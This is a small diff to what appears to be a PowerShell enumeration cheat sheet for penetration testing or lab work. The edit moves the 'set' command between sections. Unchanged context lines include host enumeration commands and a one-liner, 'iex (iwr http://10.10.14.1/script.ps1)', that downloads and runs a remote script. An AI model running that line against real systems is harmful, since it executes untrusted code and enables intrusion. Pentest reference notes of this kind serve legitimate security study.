@@ -8,6 +8,7 @@ $PSVersionTable.PSVersion
 powershell -command $PSVersionTable.PSVersion
 
 1. Basic System Enumeration
+set
 whoami
 hostname
 systeminfo
@@ -68,7 +69,6 @@ iex (iwr http://10.10.14.1/script.ps1)
 [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("encoded"))
 
 10. Environment & Variables
-set
 Get-ChildItem Env:
 echo $env:USERNAME
 echo $env:PATH
